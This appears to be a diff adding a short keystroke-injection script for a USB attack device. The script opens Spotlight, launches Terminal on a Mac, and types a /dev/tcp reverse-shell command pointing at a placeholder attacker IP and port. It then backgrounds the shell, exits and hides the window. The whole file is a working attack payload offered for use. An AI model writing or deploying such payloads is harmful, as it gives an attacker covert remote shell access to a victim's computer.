@@ -1,0 +1,15 @@
+REM Creates a reverse shell using unix shell
+DELAY #START_DELAY
+COMMAND SPACE
+DELAY #SEARCH_DELAY
+STRING terminal
+ENTER
+DELAY #TERMINAL_DELAY
+STRING sh -i >& /dev/tcp/
+STRING #IP
+STRING /
+STRING #PORT
+SPACE
+STRING 0>&1 &! exit
+ENTER
+COMMAND h
